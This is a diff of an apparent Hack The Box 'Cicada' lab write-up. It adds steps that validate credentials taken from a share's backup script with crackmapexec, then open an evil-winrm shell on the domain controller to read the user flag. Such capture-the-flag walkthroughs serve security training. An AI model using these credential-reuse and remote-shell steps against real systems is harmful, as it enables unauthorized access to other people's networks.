@@ -458,6 +458,10 @@ smb: \> ls
 
 <br />
 
+### Backup_script.ps1:
+
+<br />
+
 Inside this shared resource, we can see a `PowerShell` script named `"Backup_script.ps1"`.
 
 We download it and list its contents:
@@ -480,10 +484,53 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 <br />
 
-Analyzing it we found more credentials: `emily.oscars:Q!3@Lp#M6b*7t*Vt`
+Analyzing it we found more credentials: `emily.oscars:Q!3@Lp#M6b*7t*Vt`.
 
 <br />
 
 ### emily.oscars:
 
 <br />
+
+These new creds work for both smb and winrm:
+
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
+❯ cme winrm cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+SMB         10.10.11.35     5985   CICADA-DC        [*] Windows 10.0 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+HTTP        10.10.11.35     5985   CICADA-DC        [*] http://10.10.11.35:5985/wsman
+HTTP        10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
+```
+
+<br />
+
+As we know, at this point, we can use the famous tool `evil-winrm` to gain access to the system and list the `user.txt` flag:
+
+<br />
+
+```bash
+❯ evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
+cd *Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
+t*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
+de493ce3050b87ade9fd7a6c82xxxxxx
+```
+
+<br />
+
+# Privilage Escalation: emily.oscars -> NT  AUTHORITY\SYSTEM 
+
+<br />
+
